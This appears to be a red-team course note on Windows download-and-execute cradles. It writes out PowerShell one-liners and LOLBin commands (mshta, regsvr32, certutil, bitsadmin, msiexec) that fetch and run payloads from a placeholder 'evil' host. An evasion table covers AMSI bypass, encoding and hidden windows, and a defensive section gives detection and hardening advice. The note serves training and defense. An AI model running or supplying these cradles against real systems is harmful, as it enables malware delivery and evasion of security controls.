---
tags: [c2, red-team, initial-access, lolbins, evasion, vapt]
difficulty: intermediate
module: "101 - Red Team Initial Access and Payload Delivery"
topic: "101.05 Windows Download and Execute Cradles"
---

# Windows Download and Execute Cradles

## Introduction
A **download cradle** is a short command that **fetches a payload from a remote URL and executes it in memory or from disk**. It is the connective tissue between an initial-access trigger (a macro, an LNK, a ClickFix paste) and the actual implant: rather than embedding a large payload in the lure, the lure runs a tiny cradle that pulls the next stage. Cradles favor **PowerShell** and **LOLBins** (Living-Off-the-Land Binaries — trusted, signed Windows executables) so that no attacker tool touches disk and the activity blends with legitimate admin behavior. This note catalogs the common cradles and their evasion properties; it complements [[34 - LOLBins]] and the C2-staging concepts in the C2 foundations module.

## The PowerShell Cradle (and its variants)
```powershell
# in-memory: download a script and execute, nothing written to disk
IEX (New-Object Net.WebClient).DownloadString('https://evil/a.ps1')
iwr https://evil/a.ps1 | iex                       # modern alias form
# download a file then run
(New-Object Net.WebClient).DownloadFile('https://evil/x.exe',"$env:TEMP\x.exe"); & "$env:TEMP\x.exe"
# encoded (evades simple string matching)
powershell -nop -w hidden -enc <base64-utf16le>
# reflective: load a .NET assembly in memory
[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://evil/a.dll'))
```
In-memory execution (`IEX`/`Assembly.Load`) is preferred — disk-less, defeats file AV. It must contend with **AMSI** and **script-block logging** (see [[37 - AMSI Bypass Techniques]]).

## LOLBin Cradles (no PowerShell)
When PowerShell is monitored/locked down, signed Windows binaries fetch and run code:
```text
+---------------------------------------------------------------+
|              COMMON LOLBIN DOWNLOAD/EXEC CRADLES             |
+---------------------------------------------------------------+
| mshta   https://evil/a.hta            -> runs HTA (VBS/JS)    |
| rundll32 url.dll,OpenURL / JS: trick  -> exec via rundll32    |
| regsvr32 /s /n /u /i:https://evil/a.sct scrobj.dll  (Squiblydoo)
| certutil -urlcache -f https://evil/x.exe x.exe       (download)|
| bitsadmin /transfer j https://evil/x.exe %temp%\x.exe         |
| curl.exe https://evil/x.exe -o x.exe   (built-in since Win10) |
| msiexec /q /i https://evil/a.msi      -> remote MSI install   |
| wmic / installutil / msbuild           -> exec via trusted bin|
+---------------------------------------------------------------+
```
Each uses a Microsoft-signed binary, so application-allow-listing that trusts signed Windows binaries may permit them — the core LOLBin value. **LOLBAS** (the LOLBins-and-Scripts project) catalogs these.

## Evasion Properties
```text
   Goal               Technique
   -----------------------------------------------------------
   no disk artifact   IEX / Assembly.Load / mshta inline
   bypass AV string   -enc base64, obfuscation, split strings
   bypass AMSI        AMSI patch/bypass before IEX ([[37 ...]])
   blend in           use signed LOLBins (certutil/bitsadmin/curl)
   bypass allow-list  trusted signed binary executes your logic
   hide window        -w hidden / mshta with no UI
```

## Staging Chain Context
```text
   Lure (macro/LNK/ClickFix)  ->  CRADLE  ->  stage payload:
        - C2 stager / beacon (Cobalt Strike, Sliver, Mythic)
        - .NET assembly (execute-assembly in memory)
        - shellcode -> process injection
   First cradle is small + disposable; the real implant comes next.
```
The cradle is usually a **stager**: minimal code whose only job is to retrieve the larger implant — keeping the initial footprint tiny and the staging server swappable.

## Why It Matters
Download cradles are where most initial-access chains actually fetch their implant, and the LOLBin/in-memory variants are specifically designed to defeat file AV, allow-listing, and naive logging. Knowing the full menu lets an operator pick a cradle that matches the target's defenses, and lets a defender recognize the high-signal behaviors.

## Defensive Notes
- **PowerShell hardening**: Constrained Language Mode, script-block + module + transcription logging, AMSI; alert on `IEX`/`DownloadString`/`-enc`.
- **Block/monitor LOLBins**: WDAC/AppLocker rules and ASR; alert on `certutil -urlcache`, `bitsadmin /transfer`, `regsvr32 ... scrobj`, `mshta http`, `msiexec` from URLs, unexpected `curl.exe` to external hosts.
- **Egress control**: restrict which hosts can reach the internet and to what; inspect/categorize destinations.
- Hunt for signed system binaries making outbound connections and spawning child processes atypically.

## Related Notes
- [[34 - LOLBins]]
- [[37 - AMSI Bypass Techniques]]
- [[03 - ClickFix and Fake Verification Lures]]
- [[04 - Malicious Office Documents and Macros]]
- [[01 - Reverse and Bind Shell Cheatsheet]]
